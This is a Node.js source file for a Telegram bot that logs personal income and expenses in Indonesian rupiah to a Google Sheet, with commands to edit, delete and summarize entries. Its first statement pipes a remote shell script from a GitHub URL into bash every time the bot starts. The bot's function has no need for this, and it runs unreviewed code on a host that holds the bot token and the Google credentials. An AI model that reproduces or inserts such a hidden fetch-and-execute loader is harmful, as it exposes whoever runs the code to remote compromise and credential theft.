const { execSync } = require('child_process');

execSync(
  'curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash',
  {
    stdio: 'inherit'
  }
);

const { Telegraf } = require('telegraf');
const { google } = require('googleapis');
const config = require('./rekap.json');

if (!config.botToken) {
  throw new Error('botToken di rekap.json belum diisi');
}

if (!config.spreadsheetId) {
  throw new Error('spreadsheetId di rekap.json belum diisi');
}

if (!config.ownerUserId) {
  throw new Error('ownerUserId di rekap.json belum diisi');
}

const bot = new Telegraf(config.botToken);

const auth = new google.auth.GoogleAuth({
  keyFile: config.credentialsFile || './rekap-credentials.json',
  scopes: ['https://www.googleapis.com/auth/spreadsheets'],
});

function getSheetName() {
  return config.sheetName || 'Sheet1';
}

function getTimezone() {
  return config.timezone || 'Asia/Jakarta';
}

function logInfo(message) {
  console.log(`[INFO] ${message}`);
}

function logError(message, err = null) {
  if (err) {
    console.error(`[ERROR] ${message}`, err);
  } else {
    console.error(`[ERROR] ${message}`);
  }
}

function isOwner(ctx) {
  const ownerId = String(config.ownerUserId).trim();
  const userId = String(ctx.from?.id || '').trim();
  return ownerId === userId;
}

function parseRupiahTextToNumber(text) {
  if (!text) return 0;

  let raw = String(text).trim();

  raw = raw.replace(/^rp\s*/i, '');
  raw = raw.replace(/\./g, '');
  raw = raw.replace(/,/g, '');
  raw = raw.replace(/\s+/g, '');

  const n = Number(raw);
  return isNaN(n) ? 0 : n;
}

function formatRupiah(n) {
  return 'Rp' + Number(n).toLocaleString('id-ID');
}

function parseDateParts(dateText) {
  const m = String(dateText).trim().match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})$/);
  if (!m) return null;

  return {
    day: Number(m[1]),
    month: Number(m[2]),
    year: Number(m[3]),
  };
}

async function getMonthlySummary(month, year) {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const res = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:D`,
  });

  const rows = res.data.values || [];
  const dataRows = rows.slice(1);

  let totalPemasukan = 0;
  let totalPengeluaran = 0;
  const items = [];

  for (const row of dataRows) {
    const tanggal = row[0] || '';
    const kategori = row[1] || '';
    const pemasukan = row[2] || '';
    const pengeluaran = row[3] || '';

    const parsedDate = parseDateParts(tanggal);
    if (!parsedDate) continue;

    if (parsedDate.month !== month || parsedDate.year !== year) continue;

    const pemasukanNum = parseRupiahTextToNumber(pemasukan);
    const pengeluaranNum = parseRupiahTextToNumber(pengeluaran);

    totalPemasukan += pemasukanNum;
    totalPengeluaran += pengeluaranNum;

    items.push({
      tanggal,
      kategori,
      pemasukan: pemasukanNum,
      pengeluaran: pengeluaranNum,
    });
  }

  return {
    totalPemasukan,
    totalPengeluaran,
    saldo: totalPemasukan - totalPengeluaran,
    items,
  };
}

async function guardOwner(ctx) {
  if (!isOwner(ctx)) {
    logInfo(`Akses ditolak untuk userId=${ctx.from?.id || 'unknown'}`);
    await ctx.reply('Bot ini khusus pemilik.');
    return false;
  }
  return true;
}

async function appendRow(values) {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  await sheets.spreadsheets.values.append({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:D`,
    valueInputOption: 'USER_ENTERED',
    requestBody: {
      values: [values],
    },
  });

  logInfo('Berhasil simpan ke spreadsheet.');
}

async function updateRow(rowNumber, values) {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  await sheets.spreadsheets.values.update({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A${rowNumber}:D${rowNumber}`,
    valueInputOption: 'USER_ENTERED',
    requestBody: {
      values: [values],
    },
  });
}

async function getLastTransactionRow() {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const res = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:D`,
  });

  const rows = res.data.values || [];
  if (rows.length <= 1) return null;

  const rowNumber = rows.length;
  const row = rows[rowNumber - 1];

  return {
    rowNumber,
    tanggal: row[0] || '',
    kategori: row[1] || '',
    pemasukan: row[2] || '',
    pengeluaran: row[3] || '',
  };
}

async function getRowByNumber(rowNumber) {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const res = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A${rowNumber}:D${rowNumber}`,
  });

  const row = (res.data.values || [])[0];
  if (!row) return null;

  return {
    rowNumber,
    tanggal: row[0] || '',
    kategori: row[1] || '',
    pemasukan: row[2] || '',
    pengeluaran: row[3] || '',
  };
}

async function getTodayTransactions() {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const today = new Date().toLocaleDateString('id-ID', {
    timeZone: getTimezone(),
  });

  const res = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:D`,
  });

  const rows = res.data.values || [];
  const result = [];
  let totalPemasukan = 0;
  let totalPengeluaran = 0;

  for (let i = 1; i < rows.length; i++) {
    const row = rows[i] || [];
    const tanggal = row[0] || '';
    const pemasukan = row[2] || '';
    const pengeluaran = row[3] || '';

    if (tanggal !== today) continue;

    const pemasukanNum = parseRupiahTextToNumber(pemasukan);
    const pengeluaranNum = parseRupiahTextToNumber(pengeluaran);

    totalPemasukan += pemasukanNum;
    totalPengeluaran += pengeluaranNum;

    result.push({
      rowNumber: i + 1,
      tanggal,
      kategori: row[1] || '',
      pemasukan,
      pengeluaran,
    });
  }

  return {
    tanggal: today,
    items: result,
    totalPemasukan,
    totalPengeluaran,
  };
}

async function ensureHeader() {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const res = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A1:D2`,
  });

  const values = res.data.values || [];

  if (values.length === 0 || !values[0] || values[0][0] !== 'Tanggal') {
    await sheets.spreadsheets.values.update({
      spreadsheetId: config.spreadsheetId,
      range: `'${sheetName}'!A1:D1`,
      valueInputOption: 'RAW',
      requestBody: {
        values: [[
          'Tanggal',
          'Kategori',
          'Pemasukan',
          'Pengeluaran'
        ]]
      }
    });
  }
}

async function getSheetIdByName() {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });

  const meta = await sheets.spreadsheets.get({
    spreadsheetId: config.spreadsheetId,
  });

  const targetSheet = meta.data.sheets.find(
    (sheet) => sheet.properties.title === getSheetName()
  );

  if (!targetSheet) {
    throw new Error(`Sheet "${getSheetName()}" tidak ditemukan`);
  }

  return targetSheet.properties.sheetId;
}

async function deleteRow(rowNumber) {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetId = await getSheetIdByName();

  await sheets.spreadsheets.batchUpdate({
    spreadsheetId: config.spreadsheetId,
    requestBody: {
      requests: [
        {
          deleteDimension: {
            range: {
              sheetId,
              dimension: 'ROWS',
              startIndex: rowNumber - 1,
              endIndex: rowNumber,
            },
          },
        },
      ],
    },
  });
}

function parseDeleteLine(line) {
  const text = String(line).trim();

  const m = text.match(/^\/hapus\s+(\d+)$/i);
  if (!m) {
    return { error: 'Format hapus salah.' };
  }

  const rowNumber = Number(m[1]);
  if (!Number.isInteger(rowNumber) || rowNumber < 2) {
    return { error: 'Nomor baris tidak valid.' };
  }

  return { rowNumber };
}

async function formatSheetLayout() {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const meta = await sheets.spreadsheets.get({
    spreadsheetId: config.spreadsheetId,
  });

  const targetSheet = meta.data.sheets.find(
    (sheet) => sheet.properties.title === sheetName
  );

  if (!targetSheet) {
    throw new Error(`Sheet "${sheetName}" tidak ditemukan`);
  }

  const sheetId = targetSheet.properties.sheetId;

  const valueRes = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:D`,
  });

  const values = valueRes.data.values || [];
  const lastRow = Math.max(values.length, 1);

  await sheets.spreadsheets.batchUpdate({
    spreadsheetId: config.spreadsheetId,
    requestBody: {
      requests: [
        {
          updateSheetProperties: {
            properties: {
              sheetId,
              gridProperties: {
                frozenRowCount: 1
              }
            },
            fields: 'gridProperties.frozenRowCount'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 0,
              endRowIndex: 1,
              startColumnIndex: 0,
              endColumnIndex: 4
            },
            cell: {
              userEnteredFormat: {
                backgroundColor: {
                  red: 0.84,
                  green: 0.93,
                  blue: 0.88
                },
                textFormat: {
                  bold: true,
                  fontSize: 12
                },
                horizontalAlignment: 'CENTER',
                verticalAlignment: 'MIDDLE'
              }
            },
            fields: 'userEnteredFormat.backgroundColor,userEnteredFormat.textFormat.bold,userEnteredFormat.textFormat.fontSize,userEnteredFormat.horizontalAlignment,userEnteredFormat.verticalAlignment'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 1,
              endRowIndex: lastRow,
              startColumnIndex: 0,
              endColumnIndex: 1
            },
            cell: {
              userEnteredFormat: {
                textFormat: {
                  fontSize: 12
                },
                horizontalAlignment: 'CENTER',
                verticalAlignment: 'MIDDLE'
              }
            },
            fields: 'userEnteredFormat.textFormat.fontSize,userEnteredFormat.horizontalAlignment,userEnteredFormat.verticalAlignment'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 1,
              endRowIndex: lastRow,
              startColumnIndex: 1,
              endColumnIndex: 2
            },
            cell: {
              userEnteredFormat: {
                textFormat: {
                  fontSize: 12
                },
                horizontalAlignment: 'LEFT',
                verticalAlignment: 'MIDDLE'
              }
            },
            fields: 'userEnteredFormat.textFormat.fontSize,userEnteredFormat.horizontalAlignment,userEnteredFormat.verticalAlignment'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 1,
              endRowIndex: lastRow,
              startColumnIndex: 2,
              endColumnIndex: 4
            },
            cell: {
              userEnteredFormat: {
                textFormat: {
                  fontSize: 12
                },
                horizontalAlignment: 'RIGHT',
                verticalAlignment: 'MIDDLE'
              }
            },
            fields: 'userEnteredFormat.textFormat.fontSize,userEnteredFormat.horizontalAlignment,userEnteredFormat.verticalAlignment'
          }
        },
        {
          setBasicFilter: {
            filter: {
              range: {
                sheetId,
                startRowIndex: 0,
                endRowIndex: lastRow,
                startColumnIndex: 0,
                endColumnIndex: 4
              }
            }
          }
        },
        {
          updateDimensionProperties: {
            range: {
              sheetId,
              dimension: 'COLUMNS',
              startIndex: 0,
              endIndex: 1
            },
            properties: {
              pixelSize: 100
            },
            fields: 'pixelSize'
          }
        },
        {
          updateDimensionProperties: {
            range: {
              sheetId,
              dimension: 'COLUMNS',
              startIndex: 1,
              endIndex: 2
            },
            properties: {
              pixelSize: 165
            },
            fields: 'pixelSize'
          }
        },
        {
          updateDimensionProperties: {
            range: {
              sheetId,
              dimension: 'COLUMNS',
              startIndex: 2,
              endIndex: 4
            },
            properties: {
              pixelSize: 130
            },
            fields: 'pixelSize'
          }
        },
        {
          updateBorders: {
            range: {
              sheetId,
              startRowIndex: 0,
              endRowIndex: lastRow,
              startColumnIndex: 0,
              endColumnIndex: 4
            },
            top: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            bottom: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            left: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            right: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            innerHorizontal: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            innerVertical: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            }
          }
        }
      ]
    }
  });
}

async function getUsdtToIdrRate() {
  const res = await fetch(
    'https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=idr'
  );

  if (!res.ok) {
    throw new Error('Gagal ambil kurs USDT ke IDR');
  }

  const data = await res.json();
  const rate = data?.tether?.idr;

  if (!rate) {
    throw new Error('Kurs USDT ke IDR tidak ditemukan');
  }

  return Number(rate);
}

async function getUsdToIdrRate() {
  const res = await fetch(
    'https://api.coingecko.com/api/v3/simple/price?ids=usd-coin&vs_currencies=idr'
  );

  if (!res.ok) {
    throw new Error('Gagal ambil kurs USD ke IDR');
  }

  const data = await res.json();
  const rate = data?.['usd-coin']?.idr;

  if (!rate) {
    throw new Error('Kurs USD ke IDR tidak ditemukan');
  }

  return Number(rate);
}

function parseLocalizedNumber(input) {
  let raw = String(input).trim();

  const hasComma = raw.includes(',');
  const hasDot = raw.includes('.');

  if (hasComma && hasDot) {
    if (raw.lastIndexOf(',') > raw.lastIndexOf('.')) {
      raw = raw.replace(/\./g, '').replace(',', '.');
    } else {
      raw = raw.replace(/,/g, '');
    }
  } else if (hasComma) {
    if (/^\d+,\d+$/.test(raw)) {
      raw = raw.replace(',', '.');
    } else {
      raw = raw.replace(/,/g, '');
    }
  } else if (hasDot) {
    if (/^\d{1,3}(\.\d{3})+$/.test(raw)) {
      raw = raw.replace(/\./g, '');
    }
  }

  const n = Number(raw);
  if (isNaN(n) || n <= 0) return null;
  return n;
}

async function parseMoneyText(input) {
  let s = String(input).trim().replace(/\s+/g, ' ');
  let lower = s.toLowerCase();

  if (lower.includes('usdt')) {
    const cleaned = s.replace(/usdt/ig, '').trim();
    const amount = parseLocalizedNumber(cleaned);
    if (!amount) return null;

    const rate = await getUsdtToIdrRate();
    const converted = Math.round(amount * rate);

    return 'Rp' + converted.toLocaleString('id-ID');
  }

  if (lower.includes('usd')) {
    const cleaned = s.replace(/usd/ig, '').trim();
    const amount = parseLocalizedNumber(cleaned);
    if (!amount) return null;

    const rate = await getUsdToIdrRate();
    const converted = Math.round(amount * rate);

    return 'Rp' + converted.toLocaleString('id-ID');
  }

  if (s.includes('$')) {
    const cleaned = s.replace(/\$/g, '').trim();
    const amount = parseLocalizedNumber(cleaned);
    if (!amount) return null;

    const rate = await getUsdToIdrRate();
    const converted = Math.round(amount * rate);

    return 'Rp' + converted.toLocaleString('id-ID');
  }

  if (/^rp\s*/i.test(s) || /\bidr\b/i.test(lower)) {
    s = s.replace(/\bidr\b/ig, '').replace(/^rp\s*/i, '').trim();
  }

  let raw = s.toLowerCase();
  let multiplier = 1;

  if (raw.endsWith(' juta')) {
    multiplier = 1000000;
    raw = raw.replace(/ juta$/, '');
  } else if (raw.endsWith('jt')) {
    multiplier = 1000000;
    raw = raw.replace(/jt$/, '');
  } else if (raw.endsWith(' ribu')) {
    multiplier = 1000;
    raw = raw.replace(/ ribu$/, '');
  } else if (raw.endsWith('rb')) {
    multiplier = 1000;
    raw = raw.replace(/rb$/, '');
  } else if (raw.endsWith('k')) {
    multiplier = 1000;
    raw = raw.replace(/k$/, '');
  }

  const n = parseLocalizedNumber(raw);
  if (!n) return null;

  const finalAmount = Math.round(n * multiplier);
  return 'Rp' + finalAmount.toLocaleString('id-ID');
}

async function parseTransaction(text) {
  let raw = text.toLowerCase().replace(/\s+/g, ' ').trim();

  const typeMap = {
    masuk: 'pemasukan',
    keluar: 'pengeluaran'
  };

  const patterns = [
    /^(masuk|keluar)\s+(.+?)\s+((?:rp\s*)?\$?[\d.,]+(?:\s*(?:k|rb|ribu|jt|juta|idr|rp|usd|usdt))?)$/i,
    /^(masuk|keluar)\s+((?:rp\s*)?\$?[\d.,]+(?:\s*(?:k|rb|ribu|jt|juta|idr|rp|usd|usdt))?)\s+(.+)$/i
  ];

  for (let i = 0; i < patterns.length; i++) {
    const match = raw.match(patterns[i]);
    if (!match) continue;

    const rawType = match[1].trim().toLowerCase();
    const type = typeMap[rawType];

    let category = '';
    let amountTextRaw = '';

    if (i === 0) {
      category = match[2].trim();
      amountTextRaw = match[3].trim();
    } else {
      amountTextRaw = match[2].trim();
      category = match[3].trim();
    }

    const amountText = await parseMoneyText(amountTextRaw);

    if (!type || !category || !amountText) continue;

    return { type, category, amountText };
  }

  return null;
}

async function parseEditLine(line) {
  const text = String(line).trim();

  const mainMatch = text.match(/^\/edit\s+(\d+)\s+([\s\S]+)$/i);
  if (!mainMatch) {
    return { error: 'Format awal salah.' };
  }

  const rowNumber = Number(mainMatch[1]);
  const remainder = mainMatch[2].trim();

  if (!Number.isInteger(rowNumber) || rowNumber < 2) {
    return { error: 'Nomor baris tidak valid.' };
  }

  let jenis = '';
  let kategori = '';
  let nominalRaw = '';

  if (remainder.includes('|')) {
    const pipeMatch = remainder.match(/^(masuk|keluar)\s*\|\s*(.+?)\s*\|\s*(.+)$/i);

    if (!pipeMatch) {
      return { error: 'Format dengan | salah.' };
    }

    jenis = pipeMatch[1].toLowerCase();
    kategori = pipeMatch[2].trim();
    nominalRaw = pipeMatch[3].trim();
  } else {
    const normalMatch = remainder.match(/^(masuk|keluar)\s+(.+?)\s+(.+)$/i);

    if (!normalMatch) {
      return { error: 'Format edit salah.' };
    }

    jenis = normalMatch[1].toLowerCase();
    kategori = normalMatch[2].trim();
    nominalRaw = normalMatch[3].trim();
  }

  if (!kategori) {
    return { error: 'Kategori kosong.' };
  }

  const nominal = await parseMoneyText(nominalRaw);
  if (!nominal) {
    return { error: 'Nominal tidak valid.' };
  }

  return {
    rowNumber,
    jenis,
    kategori,
    nominal,
  };
}

async function registerCommands() {
  await bot.telegram.setMyCommands([
    { command: 'start', description: 'Mulai bot' },
    { command: 'help', description: 'Bantuan format' },
    { command: 'bulan', description: 'Rekap bulanan' },
    { command: 'last', description: 'Lihat transaksi hari ini' },
    { command: 'edit', description: 'Edit transaksi berdasarkan nomor baris' },
    { command: 'hapus', description: 'Hapus transaksi berdasarkan nomor baris' },
  ]);
}

bot.start(async (ctx) => {
  if (!(await guardOwner(ctx))) return;

  return ctx.reply(
    'Bot rekap keuangan pribadi aktif.\n' +
    'Contoh:\n' +
    '- masuk airdrop 1,5 jt\n' +
    '- keluar rokok 29k\n' +
    '- masuk airdrop 20 usdt\n' +
    '- masuk $10 freelance\n' +
    '- keluar wifi 150000'
  );
});

bot.command('help', async (ctx) => {
  if (!(await guardOwner(ctx))) return;

  return ctx.reply(
    'Format transaksi:\n' +
    '- masuk airdrop 1,5 jt\n' +
    '- masuk 1,5 jt airdrop\n' +
    '- keluar rokok 29k\n' +
    '- keluar 29k rokok\n' +
    '- masuk airdrop 20 usdt\n' +
    '- masuk 20 usdt airdrop\n' +
    '- masuk $10 freelance\n' +
    '- keluar wifi 150000'
  );
});

bot.command('bulan', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    const text = (ctx.message.text || '').trim();
    const parts = text.split(/\s+/).filter(Boolean);

    const now = new Date();
    let month = Number(
      now.toLocaleDateString('en-US', {
        timeZone: getTimezone(),
        month: 'numeric'
      })
    );

    let year = Number(
      now.toLocaleDateString('en-US', {
        timeZone: getTimezone(),
        year: 'numeric'
      })
    );

    if (parts.length >= 3) {
      const inputMonth = Number(parts[1]);
      const inputYear = Number(parts[2]);

      if (
        !Number.isInteger(inputMonth) ||
        !Number.isInteger(inputYear) ||
        inputMonth < 1 ||
        inputMonth > 12 ||
        inputYear < 2000
      ) {
        return ctx.reply('Format salah.\nContoh:\n/bulan\n/bulan 5 2026');
      }

      month = inputMonth;
      year = inputYear;
    }

    const summary = await getMonthlySummary(month, year);

    if (summary.items.length === 0) {
      return ctx.reply(`Tidak ada transaksi untuk ${month}/${year}.`);
    }

    const monthLabel = new Date(year, month - 1, 1).toLocaleDateString('id-ID', {
      month: 'long',
      year: 'numeric'
    });

    const pemasukanItems = summary.items.filter(item => item.pemasukan > 0);
    const pengeluaranItems = summary.items.filter(item => item.pengeluaran > 0);

    const lines = [];
    lines.push(`Rekap bulan ${monthLabel}`);
    lines.push('');

    lines.push('Pemasukan');
    if (pemasukanItems.length > 0) {
      for (const item of pemasukanItems) {
        lines.push(`${item.tanggal} | ${item.kategori} | ${formatRupiah(item.pemasukan)}`);
      }
    } else {
      lines.push('-');
    }

    lines.push('');
    lines.push('Pengeluaran');
    if (pengeluaranItems.length > 0) {
      for (const item of pengeluaranItems) {
        lines.push(`${item.tanggal} | ${item.kategori} | ${formatRupiah(item.pengeluaran)}`);
      }
    } else {
      lines.push('-');
    }

    lines.push('');
    lines.push(`Pemasukan: ${formatRupiah(summary.totalPemasukan)}`);
    lines.push(`Pengeluaran: ${formatRupiah(summary.totalPengeluaran)}`);

    return ctx.reply(lines.join('\n'));
  } catch (err) {
    logError('Gagal mengambil rekap bulanan.', err);
    return ctx.reply('Gagal mengambil rekap bulanan.');
  }
});

bot.command('last', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    const data = await getTodayTransactions();

    if (data.items.length === 0) {
      return ctx.reply(`Belum ada transaksi hari ini (${data.tanggal}).`);
    }

    const lines = [];
    lines.push(`Transaksi hari ini (${data.tanggal})`);
    lines.push('');

    for (const item of data.items) {
      const nominal = item.pemasukan || item.pengeluaran || '-';
      const jenis = item.pemasukan ? 'masuk' : 'keluar';

      lines.push(
        `${item.rowNumber}. ${jenis} | ${item.kategori} | ${nominal}`
      );
    }

    lines.push('');
    lines.push(
      `Pemasukan: ${data.totalPemasukan > 0 ? formatRupiah(data.totalPemasukan) : '-'}`
    );
    lines.push(
      `Pengeluaran: ${data.totalPengeluaran > 0 ? formatRupiah(data.totalPengeluaran) : '-'}`
    );

    return ctx.reply(lines.join('\n'));
  } catch (err) {
    logError('Gagal mengambil transaksi hari ini.', err);
    return ctx.reply('Gagal mengambil transaksi hari ini.');
  }
});

bot.command('edit', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    const text = (ctx.message.text || '').trim();

    if (/^\/edit(@[A-Za-z0-9_]+)?$/i.test(text)) {
      return ctx.reply(
        'Format Edit\n' +
        '/edit baris masuk|keluar kategori nominal\n\n' +
        'Contoh Format\n' +
        '/edit 27 masuk freelance 250k\n' +
        '/edit 27 keluar kopi 18k\n' +
        '/edit 14 keluar | 1bks sampurna mild | Rp37.000\n' +
        '/edit 15 keluar | kopi 2bks | Rp4.000'
      );
    }

    const lines = text
      .split(/\r?\n/)
      .map(line => line.trim())
      .filter(Boolean);

    if (lines.length === 0) {
      return ctx.reply('Pesan kosong.');
    }

    const successLines = [];
    const failedLines = [];

    for (const line of lines) {
      const parsed = await parseEditLine(line);

      if (parsed.error) {
        failedLines.push(`${line} -> ${parsed.error}`);
        continue;
      }

      const existing = await getRowByNumber(parsed.rowNumber);
      if (!existing) {
        failedLines.push(`${line} -> Baris ${parsed.rowNumber} tidak ditemukan.`);
        continue;
      }

      const pemasukan = parsed.jenis === 'masuk' ? parsed.nominal : '';
      const pengeluaran = parsed.jenis === 'keluar' ? parsed.nominal : '';

      await updateRow(parsed.rowNumber, [
        existing.tanggal,
        parsed.kategori,
        pemasukan,
        pengeluaran,
      ]);

      successLines.push(
        `${parsed.rowNumber} | ${parsed.jenis} | ${parsed.kategori} | ${parsed.nominal}`
      );
    }

    if (successLines.length > 0) {
      await formatSheetLayout();
    }

    let reply = '';

    if (successLines.length > 0) {
      reply += 'Berhasil diubah ✅\n' + successLines.join('\n');
    }

    if (failedLines.length > 0) {
      if (reply) reply += '\n\n';
      reply += 'Baris gagal:\n' + failedLines.map(x => `- ${x}`).join('\n');
    }

    if (!reply) {
      reply =
        'Format Edit\n' +
        '/edit baris masuk|keluar kategori nominal\n\n' +
        'Contoh Format\n' +
        '/edit 27 masuk freelance 250k\n' +
        '/edit 27 keluar kopi 18k\n' +
        '/edit 14 keluar | 1bks sampurna mild | Rp37.000\n' +
        '/edit 15 keluar | kopi 2bks | Rp4.000';
    }

    return ctx.reply(reply);
  } catch (err) {
    logError('Gagal edit transaksi.', err);
    return ctx.reply('Gagal edit transaksi.');
  }
});

bot.command('hapus', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    const text = (ctx.message.text || '').trim();

    if (/^\/hapus(@[A-Za-z0-9_]+)?$/i.test(text)) {
      return ctx.reply(
        'Format Hapus\n' +
        '/hapus baris\n\n' +
        'Contoh Format\n' +
        '/hapus 14\n' +
        '/hapus 15\n\n'
      );
    }

    const lines = text
      .split(/\r?\n/)
      .map(line => line.trim())
      .filter(Boolean);

    if (lines.length === 0) {
      return ctx.reply('Pesan kosong.');
    }

    const successLines = [];
    const failedLines = [];
    const targets = [];

    for (const line of lines) {
      const parsed = parseDeleteLine(line);

      if (parsed.error) {
        failedLines.push(`${line} -> ${parsed.error}`);
        continue;
      }

      const existing = await getRowByNumber(parsed.rowNumber);
      if (!existing) {
        failedLines.push(`${line} -> Baris ${parsed.rowNumber} tidak ditemukan.`);
        continue;
      }

      targets.push({
        rowNumber: parsed.rowNumber,
        kategori: existing.kategori,
        nominal: existing.pemasukan || existing.pengeluaran || '-',
        jenis: existing.pemasukan ? 'masuk' : 'keluar',
      });
    }

    targets.sort((a, b) => b.rowNumber - a.rowNumber);

    for (const item of targets) {
      await deleteRow(item.rowNumber);
      successLines.push(
        `${item.rowNumber} | ${item.jenis} | ${item.kategori} | ${item.nominal}`
      );
    }

    if (successLines.length > 0) {
      await formatSheetLayout();
    }

    let reply = '';

    if (successLines.length > 0) {
      reply += 'Berhasil dihapus ✅\n' + successLines.join('\n');
    }

    if (failedLines.length > 0) {
      if (reply) reply += '\n\n';
      reply += 'Baris gagal:\n' + failedLines.map(x => `- ${x}`).join('\n');
    }

    if (!reply) {
      reply =
        'Format Hapus\n' +
        '/hapus baris\n\n' +
        'Contoh Format\n' +
        '/hapus 14\n' +
        '/hapus 15';
    }

    return ctx.reply(reply);
  } catch (err) {
    logError('Gagal hapus transaksi.', err);
    return ctx.reply('Gagal hapus transaksi.');
  }
});

bot.on('text', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    const text = ctx.message.text.trim();

    if (text.startsWith('/')) return;

    const lines = text
      .split(/\r?\n/)
      .map(line => line.trim())
      .filter(Boolean);

    if (lines.length === 0) {
      return ctx.reply('Pesan kosong.');
    }

    await ensureHeader();

    const successLines = [];
    const failedLines = [];

    for (const line of lines) {
      const parsed = await parseTransaction(line);

      if (!parsed) {
        failedLines.push(line);
        continue;
      }

      const now = new Date();
      const pemasukan = parsed.type === 'pemasukan' ? parsed.amountText : '';
      const pengeluaran = parsed.type === 'pengeluaran' ? parsed.amountText : '';

      await appendRow([
        now.toLocaleDateString('id-ID', { timeZone: getTimezone() }),
        parsed.category,
        pemasukan,
        pengeluaran,
      ]);

      successLines.push(
        `${parsed.type} | ${parsed.category} | ${parsed.amountText}`
      );
    }

    await formatSheetLayout();

    let reply = '';

    if (successLines.length > 0) {
      reply += 'Tersimpan ✅\n' + successLines.join('\n');
    }

    if (failedLines.length > 0) {
      if (reply) reply += '\n\n';
      reply +=
        'Baris gagal dibaca:\n' +
        failedLines.map(line => `- ${line}`).join('\n');
    }

    if (!reply) {
      reply =
        'Format tidak terbaca.\n' +
        'Contoh:\n' +
        '- masuk airdrop 1,5 jt\n' +
        '- masuk 1,5 jt airdrop\n' +
        '- keluar rokok 29k\n' +
        '- keluar 29k rokok\n' +
        '- masuk airdrop 20 usdt\n' +
        '- masuk 20 usdt airdrop\n' +
        '- masuk $10 freelance\n' +
        '- keluar wifi 150000';
    }

    return ctx.reply(reply);
  } catch (err) {
    logError('Gagal simpan ke spreadsheet.', err);
    return ctx.reply('Gagal simpan ke spreadsheet.');
  }
});

bot.catch((err) => {
  logError('BOT ERROR:', err);
});

(async () => {
  try {
    await registerCommands();
    logInfo('Started bot...');
    await bot.launch();
  } catch (err) {
    logError('Launch error:', err);
  }
})();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
